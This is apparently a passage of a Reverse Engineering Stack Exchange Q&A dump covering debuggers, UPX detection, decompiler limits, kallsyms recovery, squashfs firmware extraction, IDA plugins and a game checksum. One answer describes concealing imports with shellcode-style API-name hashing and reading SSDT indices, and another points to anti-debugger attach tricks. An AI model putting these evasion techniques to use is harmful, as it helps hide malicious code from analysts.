<li><code>PATH=""C:\python27;%PATH%""</code></li>
<li><code>PYTHONHOME=""C:\python27""</code></li>
<li><code>PYTHONPATH=""C:\Python27\DLLs;C:\Python27\Lib;C:\Python27\Lib\site-packages""</code></li>
</ul>

<p>The following changes made it work for me.</p>
","12174"
"How to debug DLL imported from an application?","6712","","<p>I want to debug a DLL when it is called from an application. For example, when Firefox calls <code>nss3.dll</code> ""<em>NSS Builtin Trusted Root CAs</em>"" to check HTTPS Certificates, I want to catch the <code>nss3.dll</code> and debug all its transactions with a known debugger like OllyDBG or any other. </p>

<p>How to trace threads created and debug them ?</p>
","<p>In OllyDBG and ImmunityDbg, in Options->Debugging Options-> Events you have an option ""Break on new module"". If this option is set, whenever a new DLL is loaded, Olly/Immdbg will break and let you do your business. </p>

<p>In Windbg follow Debug-> Event Filters, in the list you will find Load module, on the side set the options to ""Enabled"" and ""Handeled"" which will achieve the same result as above.</p>

<p>If on the other hand you want to break on the specific function, you can check the DLL exports which lists all the functions exported by DLL. After the DLL is loaded, and the debugger breaks as per previously mentioned settings, you can then proceed to set the breakpoints on individual functions. </p>
","2729"
"OllyDbg find function by name","6641","","<p>I have exe file that I want to edit function in it.<br>
I know what is the function name, but how can I found the address by it name?</p>
","<p>If the file has debugging symbols (i.e. you have a corresponding .pdb file), just load the file into your favourite debugger (Windbg, Olly, Ida Pro) and you're done, since the debugger will match function names and addresses from the symbol table.</p>

<p>If you don't have debugging symbols (and your function isn't a special case, like an exported function in a DLL), knowing the function name generally won't help you anything, since this information is lost in the executable.</p>

<p>However, if you know a bit more about the function, this knowledge might help you. For example, if you have a function that implements the <a href=""https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm"" rel=""nofollow noreferrer"">TEA algorithm</a>, scanning the disassembled file for <code>9e3779b9</code> could help you. (There's a tool named signsrch that does this for many well-known encryption and checksum variants). Or, if you know the function uses a certain string, search for this string, then check where it's cross referenced.</p>

<p>You might be even lucky enough that the programmer used an <code>assert</code> (or similar) macro. Depending on the Compiler, this often translates to a <code>printf</code> which includes <code>__FUNC__</code> which in turn is replaced with the function name, so an assert macro will most likely put the function name as a string, along with a cross reference from your function, into your binary.</p>

<p>Once you have a string that you know belongs to your function, use <code>CTRL-R</code> on it to find where it's referenced in code (<a href=""https://stackoverflow.com/questions/24554127/ollydbg-2-01-finding-a-command-referencing-a-static-string"">longer explanation on stackoverflow</a>).</p>
","9147"
"How should I determine the format of this audio file?","6623","","<p>I have an audio file in an unknown format. How should I try to determine its format ?</p>

<p>Also, is it possible to do this by manual observation and not using any automated tool ?</p>
","<p>As for the automated approach, the <a href=""http://en.wikipedia.org/wiki/File_(command)"">file command</a> is the classic recommendation. It's a tool which tries to guess the file type from the data contained in the file. It implements many of the well known file format signatures via <a href=""http://sourceforge.net/projects/libmagic/"">libmagic</a>. If you have a composite file you could try <a href=""https://code.google.com/p/binwalk/"">binwalk</a> which will try to find files as subsets of a larger file.</p>

<p>If you want to go the manual route, you need to match some subset of the file to a known signature or pattern. This applies especially when it comes to file formats which are likely to be compressed as data patterns will be less regular. Therefore you usually need to find a pattern, usually called a signature or fingerprint, in the file structure. Most file formats have magic numbers either in the header or the footer of the file in order to make it easy for programs to check what type of file they are about to load. There are a couple of good resources for well known file signatures:</p>

<ul>
<li><a href=""http://www.garykessler.net/library/file_sigs.html"">Garry Kesslers' file signature list</a></li>
<li><a href=""http://en.wikipedia.org/wiki/List_of_file_signatures"">Wikipedia's List of file signatures</a></li>
<li><a href=""http://filesignatures.net"">The file signature database</a></li>
</ul>
","325"
"How to check if an ELF file is UPX packed?","6623","","<p>I have an ELF file and want to know if it is UPX packed. How can I detect UPX compression in GNU/Linux?</p>
","<p>Okay, assuming vanilla UPX you should be fine by detecting the strings <code>UPX!</code> or <code>UPX0</code>. As far as I remember this would also work on Windows.</p>

<p>So it's a shell one-liner such as:</p>

<pre><code>grep UPX\! &lt;filename&gt;
</code></pre>

<p>or</p>

<pre><code>grep UPX0 &lt;filename&gt;
</code></pre>

<p>... assuming the GNU version of <code>grep</code> here.</p>

<hr>

<p>Another method, but using the same principle:</p>

<pre><code>$ hexdump -C &lt;filename&gt; |grep -C 1 UPX
000000a0  00 00 00 00 00 00 00 00  00 00 20 00 00 00 00 00  |.......... .....|
000000b0  c3 af e9 18 55 50 58 21  20 08 0d 16 00 00 00 00  |....UPX! .......|
000000c0  a0 fd 16 00 a0 fd 16 00  38 02 00 00 c6 00 00 00  |........8.......|
--
0000cf60  fe 61 03 83 78 b5 54 03  67 8b 85 2d ca a8 12 3c  |.a..x.T.g..-...&lt;|
0000cf70  44 ad bc 12 ab 7e 86 55  50 58 30 0e 01 ee 7c 64  |D....~.UPX0...|d|
0000cf80  00 f7 d1 80 4a 11 03 58  6e ac 0d 01 ff 92 83 e8  |....J..Xn.......|
--
000544e0  73 20 66 69 6c 65 20 69  73 20 70 61 63 6b 65 64  |s file is packed|
000544f0  20 77 69 74 68 20 74 68  65 20 55 50 58 20 65 78  | with the UPX ex|
00054500  65 63 75 74 61 62 6c 65  20 70 61 63 6b 65 72 20  |ecutable packer |
00054510  68 74 74 70 3a 2f 2f 75  70 78 2e 73 66 2e 6e 65  |http://upx.sf.ne|
00054520  74 20 24 0a 00 24 49 64  3a 20 55 50 58 20 33 2e  |t $..$Id: UPX 3.|
00054530  30 38 20 43 6f 70 79 72  69 67 68 74 20 28 43 29  |08 Copyright (C)|
--
00054e40  7d 24 24 92 b7 0c 7f 12  01 a8 24 49 92 ff 00 00  |}$$.......$I....|
00054e50  00 00 55 50 58 21 00 00  00 00 00 00 55 50 58 21  |..UPX!......UPX!|
00054e60  0d 16 08 07 80 44 b5 80  b9 9a 8a d9 a0 08 00 00  |.....D..........|
</code></pre>
","169"
"Why are machine code decompilers less capable than for example those for the CLR and JVM?","6568","","<p>Java and .NET decompilers can (usually) produce an almost perfect source code, often very close to the original.</p>

<p>Why can't the same be done for the native code? I tried a few but they either don't work or produce a mess of gotos and casts with pointers.</p>
","<p>TL;DR:  machine code decompilers are very useful, but do not expect the same miracles that they provide for managed languages.  To name several limitations:  the result generally can't be recompiled, lacks names, types, and other crucial information from the original source code, is likely to be much more difficult to read than the original source code minus comments, and might leave weird processor-specific artifacts in the decompilation listing.</p>

<ol>
<li><p><strong>Why are decompilers so popular?</strong></p>

<p>Decompilers are very attractive reverse engineering tools because they have the potential to save a lot of work.  In fact, they are so unreasonably effective for managed languages such as Java and .NET that ""Java and .NET reverse engineering"" is virtually non-existent as a topic.  This situation causes many beginners to wonder whether the same is true for machine code.  Unfortunately, this is not the case.  Machine code decompilers do exist, and are useful at saving the analyst time.  However, they are merely an aid to a very manual process.  The reason this is true is that bytecode language and machine code decompilers are faced with a different set of challenges.</p></li>
<li><p><strong>Will I see the original variable names in the decompiled source code?</strong></p>

<p>Some challenges arise from the loss of semantic information throughout the compilation process.  Managed languages often preserve the names of variables, such as the names of fields within an object.  Therefore, it is easy to present the human analyst with names that the programmer created which hopefully are meaningful.  This improves the speed of comprehension of decompiled machine code.</p>

<p>On the other hand, compilers for machine-code programs usually destroy most of all of this information while compiling the program (perhaps leaving some of it behind in the form of debug information).  Therefore, even if a machine code decompiler was perfect in every other way, it would still render non-informative variable names (such as ""v11"", ""a0"", ""esi0"", etc.) that would slow the speed of human comprehension.</p></li>
<li><p><strong>Can I recompile the decompiled program?</strong></p>

<p>Some challenges relate to disassembling the program.  In bytecode languages such as Java and .NET, the metadata associated with the compiled object will generally describe the locations of all code bytes within the object.  I.e., all functions will have an entry in some table in a header of the object.</p>

<p>In machine language on the other hand, to take x86 Windows disassembly for example, without the help of heavy debug information such as a PDB the disassembler does not know where the code within the binary is located.  It is given some hints such as the entrypoint of the program.  As a result, machine code disassemblers are forced to implement their own algorithms to discover the code locations within the binary.  They generally use two algorithms:  linear sweep (scan through the text section looking for known byte sequences that usually denote the beginning of a function), and recursive traversal (when a call instruction to a fixed location is encountered, consider that location as containing code).</p>

<p>However, these algorithms generally will not discover all of the code within the binary, due to compiler optimizations such as interprocedural register allocation that modify function prologues causing the linear sweep component to fail, and due to naturally-occurring indirect control flow (i.e. call via function pointer) causing the recursive traversal to fail.  Therefore, even if a machine code decompiler encountered no problems other than that one, it could not generally produce a decompilation for an entire program, and hence the result would not be able to be recompiled.</p>

<p>The code/data separation problem described above falls into a special category of theoretical problems, called the ""undecidable"" problems, which it shares with other impossible problems such as the Halting Problem.  Therefore, abandon hope of finding an automated machine code decompiler that will produce output that can be recompiled to obtain a clone of the original binary.</p></li>
<li><p><strong>Will I have information about the objects used by the decompiled program?</strong></p>

<p>There are also challenges relating to the nature of how languages such as C and C++ are compiled versus the managed languages; I'll discuss type information here.  In Java bytecode, there is a dedicated instruction called 'new' to allocate objects.  It takes an integer argument which is interpreted as a reference into the .class file metadata which describes the object to be allocated.  This metadata in turn describes the layout of the class, the names and types of the members, and so on.  This makes it very easy to decompile references to the class in a way that is pleasing to the human inspector.</p>

<p>When a C++ program is compiled, on the other hand, in the absence of debug information such as RTTI, object creation is not conducted in a neat and tidy way.  It calls a user-specifiable memory allocator, and then passes the resulting pointer as an argument to the constructor function (which may also be inlined, and therefore not a function).  The instructions that access class members are syntactically indistinguishable from local variable references, array references, etc.  Furthermore, the layout of the class is not stored anywhere in the binary.  In effect, the only way to discover the data structures in a stripped binary is through data flow analysis.  Therefore, a decompiler has to implement its own type reconstruction in order to cope with the situation.  In fact, the popular decompiler Hex-Rays mostly leaves this task up to the human analyst (though it also offers the human useful assistance).</p></li>
<li><p><strong>Will the decompilation basically resemble the original source code in terms of its control flow structure?</strong></p>

<p>Some challenges stem from compiler optimizations having been applied to the compiled binary.  The popular optimization known as ""tail merging"" causes the control flow of the program to be mutilated compared to less-aggressive compilers, which usually manifests itself as a lot of goto statements within the decompilation.   The compilation of sparse switch statements can cause similar problems.  On the other hand, managed languages often have switch statement instructions.</p></li>
<li><p><strong>Will the decompiler give meaningful output when obscure facets of the processor are involved?</strong></p>

<p>Some challenges stem from architectural features of the processor in question.  For example, the built-in floating point unit on x86 is a nightmare of an ordeal.  There are no floating point ""registers"", there is a floating point ""stack"", and it must be tracked precisely in order for the program to be properly decompiled.  In contrast, managed languages often have specialized instructions for dealing with floating-point values, which are themselves variables.  (Hex-Rays handles floating point arithmetic just fine.)  Or consider the fact that there are many hundreds of legal instruction types on x86, most of which are never produced by a regular compiler without the user explicitly specifying that it should do so via an intrinsic.  A decompiler must include special processing for those instructions which it supports natively, and so most decompilers simply include support for the ones most commonly generated by compilers, using inline assembly or (at best) intrinsics for those which it does not support.</p></li>
</ol>

<p>These are merely a few of the accessible examples of challenges that plague machine code decompilers.  We can expect that limitations will remain for the foreseeable future.  Therefore, do not seek a magic bullet that is as effective as managed language decompilers.</p>
","312"
"Locating Linux Kernel Symbols on ARM","6510","","<p>Igor posted a great <a href=""https://stackoverflow.com/a/14811668/139463"">answer</a> previously on SO about the format of the Linux kernel image on ARM.</p>

<p>Assuming I can't boot my kernel image, can someone give me pointers on finding this compressed symbol table in the binary?  </p>
","<p>After decompressing and loading the kernel, you need to find a couple of tables that encode the compressed symbol table. These are (in the usual order they are placed in binary):</p>

<ul>
<li><code>kallsyms_addresses</code> - a table of addresses to all public symbols in the kernel</li>
<li><code>kallsyms_num_syms</code> - not a table but just an integer with total number of symbols (should match previous table)</li>
<li><code>kallsyms_names</code> - a list of length-prefixed byte arrays that encode indexes into the token table</li>
<li><code>kallsyms_token_table</code> - a list of 256 zero-terminated tokens from which symbol names are built</li>
<li><code>kallsyms_token_index</code> - 256 shorts pointing to the corresponding entry in <code>kallsyms_token_table</code></li>
</ul>

<p>They're not hard to find with some experience. A good way to find the first one is to look for several 0xC0008000 values in a row, because a typical kernel symbol table starts like this:</p>

<pre><code>C0008000 T __init_begin
C0008000 T _sinittext
C0008000 T _stext
C0008000 T stext
</code></pre>

<p>After locating the tables the symbol recovery is trivial. I made a script for IDA that does it automatically, you can find it <a href=""http://www.hexblog.com/?p=130"">here</a> (<code>kallsyms.py</code> in the tools zip).</p>

<p>For more the details of how it's implemented in the kernel, see <code>kernel/kallsyms.c</code>.</p>
","1928"
"Router Decompiling","6497","","<p>I am trying to extract the squashfs filesystem of my router. <a href=""http://www.downloads.netgear.com/files/GDC/WNDR3400V2/WNDR3400v2_V1.0.0.38_1.0.61.zip"" rel=""noreferrer"">Here is firmware</a>.</p>

<p>First, I unzipped the file. Next, I ran <code>binwalk</code> to get some information about the file.</p>

<pre><code>DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------
58          0x3A        TRX firmware header, little endian, header size: 28 bytes,  image size: 6656000 bytes, CRC32: 0x2B1713B2 flags/version: 0x10000
86          0x56        LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 3614368 bytes
1282426     0x13917A    Squashfs filesystem, little endian, non-standard signature,  version 3.0, size: 5367357 bytes,  853 inodes, blocksize: 65536 bytes, created: Wed Aug  7 05:08:47 2013 
</code></pre>

<p>I then ran <code>binwalk -e</code> to extract the contents of the file. I got three files:</p>

<pre><code>.
├── 13917A.squashfs
├── 56
└── 56.7z
</code></pre>

<p>Running <code>unsquashfs</code> on <code>13917A.squashfs</code> failed, saying it was unable to find the magic block. This was because the file was using a non standard magic. Changing the magic to a standard one made <code>unsquashfs</code> and <code>file</code> detect it as a squashfs file system. But <code>unsquashfs</code> did not complete successfully:</p>

<pre><code>caff@UbunutuX2:~/Netgear/test$ unsquashfs 13917A.squashfs 
Reading a different endian SQUASHFS filesystem on 13917A.squashfs
Filesystem on 13917A.squashfs is (768:0), which is a later filesystem version than I support!
</code></pre>

<p>I also tried extracting the file system by using <a href=""https://code.google.com/p/firmware-mod-kit"" rel=""noreferrer"">Jeremy Collake’s Firmware Mod Kit</a>. This failed also:</p>

<pre><code>caff@UbunutuX2:~/Netgear/test$ /opt/firmware-mod-kit/trunk/unsquashfs_all.sh 13917A.squashfs 
Attempting to extract SquashFS .X file system...


Trying ./src/others/squashfs-3.4-nb4/unsquashfs-lzma... Skipping others/squashfs-hg55x-bin (wrong version)...
File extraction failed!
</code></pre>

<p>How do I extract this squashfs file system?</p>
","<p>After unziping the arhive, run <code>binwalk</code> with</p>

<pre><code>binwalk -eM *.chm
</code></pre>

<p>Flag e stands for extract automatically,and M for <code>--matryoshka</code> or recursively scanning and extracting.</p>

<p>After a few recursive unpackings, you'll get a squashfs-root dir with what you want I guess. </p>

<p>For what it's worth, I tried this with binwalk version 1.2.1.</p>
","4035"
"How to attach debugger to app if it has protection against attaching?","6478","","<p>Sometimes I've tried to attach Ollydbg to applications those have some protection against debuggers, but I have never coded any of these applications and did not see this protection in many applications... So it looks like it is not hard to bypass this, however I am curious and never tried it before. How do you do it guys? (at least some examples on some simple program).</p>

<p>Thanks in advance.</p>
","<p>Anti-attaching depends heavily on the fact that windows creates a remote thread in the target
process. What is specific about this thread is usually used to detect attaching.</p>

<p>For example: 
The entry point Windows chooses for the attaching thread is by default the ""DbgUiRemoteBreakin"" function. Anti-attaching tricks usually hook this function or its
sibling, the ""DbgBreakPoint"" function.</p>

<p>Also, The fact that the attaching thread (like most normal threads) will have
the associated TLS callbacks called is also exploited to detect attaching.</p>

<p>Debug blocks, NtContinue, ThreadHideFromDebugger etc.</p>

<p><a href=""http://waleedassar.blogspot.de/2011/12/debuggers-anti-attaching-techniques.html"">http://waleedassar.blogspot.de/2011/12/debuggers-anti-attaching-techniques.html</a>
<a href=""http://waleedassar.blogspot.de/2011/12/debuggers-anti-attaching-techniques_11.html"">http://waleedassar.blogspot.de/2011/12/debuggers-anti-attaching-techniques_11.html</a>
<a href=""http://waleedassar.blogspot.de/2011/12/debuggers-anti-attaching-techniques_13.html"">http://waleedassar.blogspot.de/2011/12/debuggers-anti-attaching-techniques_13.html</a>
<a href=""http://waleedassar.blogspot.de/2012/02/debuggers-anti-attaching-techniques_15.html"">http://waleedassar.blogspot.de/2012/02/debuggers-anti-attaching-techniques_15.html</a>
<a href=""http://waleedassar.blogspot.de/2012/11/sizeofstackreserve-as-anti-attaching.html"">http://waleedassar.blogspot.de/2012/11/sizeofstackreserve-as-anti-attaching.html</a></p>
","3058"
"Could you list some useful plugins and scripts for IDA Pro?","6405","","<p>I am just starting to use <a href=""https://www.hex-rays.com/products/ida/"">IDA Pro</a>. After discussing a bit with the community, it seems that IDA Pro plugins and scripts are quite important to reach a good level of productivity while analyzing a program.</p>

<p>What are some <em>must have</em> plugins for IDApro that you would recommend for an everyday usage.</p>
","<h1>By Architecture</h1>

<p><em>Generic helpers for reverse engineering of a specific architecture.</em></p>

<h2>ia32</h2>

<h2>amd64</h2>

<h2>ARM</h2>

<hr>

<h1>By Operating System</h1>

<p><em>Generic helpers for reverse engineering of a specific operating system.</em></p>

<h2>Windows</h2>

<h2>Linux</h2>

<hr>

<h1>By Compiler</h1>

<p><em>Generic helpers for reverse engineering of binaries generated using a specific compiler.</em></p>

<h2>Microsoft Visual Studio</h2>

<h3><a href=""http://www.openrce.org/downloads/details/196/Microsoft_VC++_Reversing_Helpers"">Microsoft Visual C++ Reversing Helpers</a></h3>

<blockquote>
  <p>These IDC scripts help with the reversing of MSVC programs. One script scans the whole program for typical SEH/EH code sequences and comments all related structures and fields. The other script scans the whole program for RTTI structures and vftables.</p>
</blockquote>

<h2>GCC</h2>

<h2>Delphi</h2>

<h3><a href=""http://www.openrce.org/downloads/details/61/Delphi_RTTI_script"">Delphi RTTI script</a></h3>

<blockquote>
  <p>This script deals with Delphi RTTI structures</p>
</blockquote>

<h2>Borland</h2>

<h3><a href=""http://www.openrce.org/downloads/details/72/Borland_C++_Builder_RTTI_Support"">Borland C++ Builder RTTI</a></h3>

<blockquote>
  <p>Borland C++ Builder Run Time Type Information (RTTI) support for IDA Pro</p>
</blockquote>

<hr>

<h1>By Technology</h1>

<p><em>Generic helpers for reverse engineering of a technology.</em></p>

<h2>COM</h2>

<h3><a href=""http://www.openrce.org/downloads/details/10/Com_Plugin_v1.2"">COM Plugin</a></h3>

<blockquote>
  <p>The plugin tries to extract the symbol information from
  the typelibrary of the COM component. It will then set the 
  function names of interface methods and their parameters, and 
  finally add a comment with the MIDL-style declaration of the 
  interface method.</p>
</blockquote>

<h2>Remote Procedure Call</h2>

<h3><a href=""http://www.openrce.org/downloads/details/186/mIDA"">mIDA</a></h3>

<blockquote>
  <p>mIDA is a plugin for the IDA disassembler that can extract RPC interfaces from a binary file and recreate the associated IDL definition. mIDA is free and fully integrates with the latest version of IDA (5.2 or later)</p>
</blockquote>

<hr>

<h1>Cryptography</h1>

<p><em>Generic helpers for reverse engineering of encryption and decryption algorithms.</em></p>

<h2>Signature Based</h2>

<h3><a href=""http://www.openrce.org/downloads/details/189/FindCrypt2"">FindCrypt2</a></h3>

<blockquote>
  <p>The idea behind it pretty simple: since almost all crypto algorithms use magic constants, we will just look for these constants in the program body.
  The plugin supports virtually all crypto algorithms and hash functions.</p>
</blockquote>

<hr>

<h1>Deobfuscation</h1>

<p><em>Plugins and scripts for removing obfuscations from disassembly.</em></p>

<h2>ia32</h2>

<h3><a href=""http://code.google.com/p/optimice/"">Optimice</a></h3>

<blockquote>
  <p>Optimice applies common optimization techniques on obfuscated code to make it more readable/user friendly. This plugin enables you to remove some common obfuscations and rewrite code to a new segment. </p>
</blockquote>
","1830"
"Can I statically link (not import) the Windows system DLLs?","6278","","<p>I have compiled following C source code in VS2010 console project.</p>

<pre><code>#include &lt;stdio.h&gt;
int main(int argc, char* argv[]){
    printf(""hello world\n"");
    return 0;
}
</code></pre>

<p>then I used <code>/MT</code> option for release mode to statically link the C-runtime library.
However, as far as I know, C-runtime library still invokes lower level system functions - 
for example, C-runtime function <code>printf</code> eventually calls <code>WriteFile</code> Windows API.</p>

<p>And the actual function body of <code>WriteFile</code> is in <code>kernel32.dll</code>.
So, even if I link the C-runtime library statically, the binary doesn't contain
the entire routine including the <code>SYSENTER</code>, or <code>INT 0x2E</code> instructions...
The core part is still in a DLL. The following diagram describes how I understand it:</p>

<p><img src=""https://i.stack.imgur.com/w2XJH.png"" alt=""enter image description here""></p>

<p>What I want is to statically link EVERYTHING into single EXE file. Including <code>kernel32.dll</code>, <code>user32.dll</code> to eliminate the necessity of loader parsing the IAT and resolving the function names.</p>

<p>The following picture describes what I want:</p>

<p><img src=""https://i.stack.imgur.com/IQtdo.png"" alt=""enter image description here""></p>

<p>I understand this is simple in Linux with <code>gcc</code>. All I have to do is give the option <code>-static</code></p>

<p>Is there any option like this in VS2010? Please correct me if I'm misunderstanding.</p>
","<p>Let me start by telling you that what you want would be impossible, because of how well-known DLLs work. You can attempt something similar with tools like <a href=""http://bitsum.com/pebundle.asp"">PEBundle</a> or <a href=""http://code.google.com/p/dllpackager/"">dllpackager</a>, but that will usually (I'd say certainly) fail with the well-known DLLs (such as system DLLs as well as even the MSVC runtime DLLs in their different incarnations). See <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586%28v=vs.85%29.aspx"">this</a> and <a href=""http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx"">this</a> on the relevance and meaning of well-known DLLs.</p>

<p><code>kernel32.dll</code> plays a <em>very</em> special role in in the Win32 subsystem in that it helps to register Win32 threads and processes with the subsystem (<code>csrss.exe</code>).</p>

<hr>

<p>Answering the part from the comment of the OP on the question:</p>

<blockquote>
  <p>in fact, I was not looking for performance advantage. I thought, in this way, I can remove every symbols just like Linux stripped binary and make the reversing harder.</p>
</blockquote>

<p>There is no point in doing it this way then. You could still only import a single function and use a convoluted way of importing DLLs and/or resolving functions. I.e. concealing which functions you are importing from which DLLs. One thing that is rather popular in hacker circles is to hash the exported function names and then walk the exports of the loaded image yourself, hashing each of the function names found and comparing with the known hashed values.</p>

<p><a href=""http://www.hick.org/code/skape/papers/win32-shellcode.pdf"">Here's a good paper</a> on one method used for what you want, because shell code has no clue about imported function addresses in a hijacked process.</p>

<p>As Igor pointed out <code>kernel32.dll</code> will be loaded into the process and AFAIR the order of that has changed as well with Vista (previously <code>ntdll.dll</code> was the first one in the <a href=""http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html"">PEB</a>'s DLL list, aka <a href=""http://undocumented.ntinternals.net/UserMode/Structures/PEB_LDR_DATA.html""><code>LoaderData</code></a>). So the exact method has been laid out in above paper.</p>

<p>A few more points:</p>

<ol>
<li>if you don't want to use <code>LoadLibrary</code> (or its <code>ntdll.dll</code> counterpart) to dynamically load the DLLs, you can keep a reference to a single imported function in the IAT - this is how some executable packers do it.</li>
<li>if not, start by resolving <code>LoadLibraryA</code>, loading the DLLs you want and then using the resolved <code>GetProcAddress</code> (or your own method used already on <code>kernel32.dll</code> and outlined in the paper) to load more functions.</li>
<li>you may be making your life harder while not making it noticeably harder to a skilled/experienced reverse engineer. Most of them will have seen a similar scheme ;) ... dynamic analysis will easily reveal your tricks and enable a reverse engineer to work around them.</li>
</ol>

<hr>

<p>As an alternative you could resort to the system call numbers by writing a simplified disassembler that is able to pick out the index into the SSDT (system service descriptor table) and then you do the rest yourself. This has been documented long ago because it is how people used to find the index into the SSDT when they wanted to hook it from within a kernel mode driver. Roughly, if you have the pointer to the function in <code>ntdll.dll</code> to which you need the SSDT index, you'd check your assumptions and then retrieve the appropriate value. In Windows NT 4 through 2003 (32 bit) this would look like</p>

<pre><code>  B8 ?? ?? ?? ??
</code></pre>

<p>where <code>B8</code> is for <code>mov eax, ????????</code> and the question marks are the index into the SSDT. So after checking for the <code>B8</code> you'd skip over it and fetch the next DWORD. Example in C code:</p>

<pre><code>if ((lpAddr) &amp;&amp; *((unsigned char *)lpAddr) == 0xB8)
{
    result = *((ULONG *)((unsigned char *)lpAddr+1));
}
</code></pre>

<p>Things will be different on different operating system versions and depending on the bitness - you have been warned.</p>

<p>But I don't see any advantage - neither performance-wise nor in deterring reverse engineering efforts.</p>
","2075"
"Guessing CRC checksum algorithm","6221","","<p>I am trying to reverse engineer a 16 bit checksum algorithm of one relatively old (10 years) LAN game that is no longer supported nor has source code available. 
As it seems, data packets don't have standard structure when it comes to placing checksum bytes:</p>

<pre><code>Example 1:

1f456e01
</code></pre>

<p>Where first byte <code>1f</code> seems to repeat itself in each packet and I assume it doesn't take part in generating checksum. </p>

<p>Next two bytes <code>456e</code> represent a checksum that presumably is a variation of <code>CRC-CCITT</code> with non-standard polynomial. </p>

<p>Lastly, <code>01</code> byte represents data.</p>

<p>Here are few more examples of packets with various data values:</p>

<pre><code>1f466e02
1f496e05
1f4b6e07
1f4c6e08
</code></pre>

<p>I wish I could post more diverse values but these are only ones I've been able to capture so far.</p>

<p>I tried fiddling with <a href=""http://reveng.sourceforge.net/"" rel=""nofollow"">reveng</a> to reverse engineer the polynomial with following command:</p>

<pre><code>reveng -w 16 -s 01456e 02466e 05496e
</code></pre>

<p>Here the checksum bytes are relocated at the end, as reveng expects them in this format. But this gave no results.</p>

<p>I have tried comparing these checksums to most if not all common crc algorithms using online calculators but none of them give even close outputs to those above.</p>

<p>Honestly, I don't know where else to look.</p>

<p>Any hints/help or anything at all is much appreciated.</p>

<p><strong>EDIT:</strong></p>

<p>I managed to capture some more samples, however they are slightly different in terms of structure:</p>

<p>Example 1:</p>

<pre><code>0e ed76 00 312e362e37544553540000000000000000000000000000000000000000 00
</code></pre>

<p>Here the first byte <code>0E</code> represents a sort of index, that I still think doesn't take part in generating checksum.
Then comes two byte checksum <code>ED76</code> followed by <code>00</code> sort of separator (newline?) byte that I also think doesn't take part in computing checksum.
Afterwards follows data sequence: <code>312e362e37544553540000000000000000000000000000000000000000</code> which finally is proceeded by <code>00</code> terminating character that I also think has nothing to do with checksum.</p>

<p>I can manipulate with the data part of this sequence of bytes so here are some more examples:</p>

<pre><code>Example 2:

HEX:    0E109D00414141414141414141414141414141414141414141414141414141414100
ASCII:  ....AAAAAAAAAAAAAAAAAAAAAAAAAAAAA.

Example 3:

HEX:    0E8DC300424242424242424242424242424242424242424242424242424242424200
ASCII:  ....BBBBBBBBBBBBBBBBBBBBBBBBBBBBB.

Example 4:

HEX:    0E403500313131313131313131313131313131313131313131313131313131313100
ASCII:  .@5.11111111111111111111111111111.

Example 5:

HEX:    0E34CF00353535353535353535353535353535353535353535353535353535353500
ASCII:  .4..55555555555555555555555555555.

Example 6:

HEX:    0E3E0C00313233343536373839304142434445464748494A4B4C4D4E4F5051525300
ASCII:  .&gt;..1234567890ABCDEFGHIJKLMNOPQRS.
</code></pre>

<p><strong>EDIT 2:</strong>  More samples added, checksum bytes reversed to show the actual 16 bit int (little endian)</p>

<pre><code>Data         Checksum

0x01         0x6E45  
0x02         0x6E46
0x03         0x6E47

0x0001       0x3284

0x0002       0x3285
0x0003       0x3286
0x0104       0x32A8
0x0005       0x3288
0x0903       0x33AF
0x0106       0x32AA

0x3600       0x0AAE          

0xAD00       0x1A05          

0xF300       0x230B 
0xF400       0x232C
0xF500       0x234D
0xF600       0x236E
0xF700       0x238F 
0xF800       0x23B0 

0xFE00       0x2476          
0xA800       0x1960          

0xE200       0x20DA
0xE500       0x213D          
0xEE00       0x2266

0x7300       0x128B
0x7600       0x12EE          
0xF700       0x238F          

0xB400       0x1AEC
0xB800       0x1B70          
0xBC00       0x1BF4

0x015E00     0xF68B
0x013D00     0xF24A
0x011C00     0xEE09 
</code></pre>

<p><strong>EDIT 3</strong>: More samples that might make it easier to see the pattern:</p>

<pre><code>Checksum     Data (ASCII)

3540         11111111111111111111111111111
3561         11111111111111111111111111112
3582         11111111111111111111111111113

3981         11111111111111111111111111121
39A2         11111111111111111111111111122

c1a1         11111111111111111111111111211
4DC1         11111111111111111111111112111

5de1         11111111111111111111111121111
7201         11111111111111111111111211111
</code></pre>

<p><strong>EDIT 4:</strong></p>

<p>There was a typo in one of <strong>EDIT 3</strong> samples - correct checksum for <code>11111111111111111111111112111</code> is <code>4DC1</code> instead of <code>C10E</code>. Edited original sample. Apologies to everyone who lost their time because of this.</p>

<p><strong>EDIT 5:</strong></p>

<p>It turns out, the index byte does play a role in calculating checksum, here is one particular example proving it:</p>

<pre><code>INDEX   CHECKSUM    PAYLOAD

0x2B    0x704E      0x7E
0x3E    0x72C1      0x7E

Same payload has different checksum for different indexes. (checksum bytes reversed to show the actual 16 bit int)
</code></pre>

<p>Some more samples:</p>

<pre><code>INDEX   CHECKSUM    PAYLOAD

0x3E    0x72C0      0x7D
0x1F    0x6E45      0x01
0x2B    0x704F      0x7F
</code></pre>

<p><strong>Epilogue</strong></p>

<p>Please see the accepted answer for the exact algorithm. Special thanks to <strong>Edward</strong>, <strong>nrz</strong> and <strong>Guntram Blohm</strong>; solving this would take a lifetime without your help guys! </p>
","<p>Got it.  Here's how to calculate, using your first string as a simple example:</p>

<pre><code>1f456e01
</code></pre>

<p>First, we rearrange the packet, omitting the checksum.</p>

<pre><code>1f 01
</code></pre>

<p>Then prepend the values A3 02:</p>

<pre><code>a3 02 1f 01
</code></pre>

<p>Then calculate the checksum by starting with a sum of 0, multiplying the sum by 33 (decimal) each time and adding the value of the next byte.</p>

<p>Here it is in C with a few of your sample strings for illustrations.  Note that this assumes a little-endian machine (e.g. x86).</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;


const unsigned char s1[]= ""\x0e\x01\x72\x00\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x32\x31\x31\x31\x31\x31\x00"";
const unsigned char s2[]=""\x2b\x4f\x70\x7f"";
const unsigned char s3[]=""\x1f\x46\x6e\x02"";

uint16_t verify(const unsigned char *pkt, size_t sz)
{
    uint16_t sum = 0xa3 * 33 + 2;
    int i;
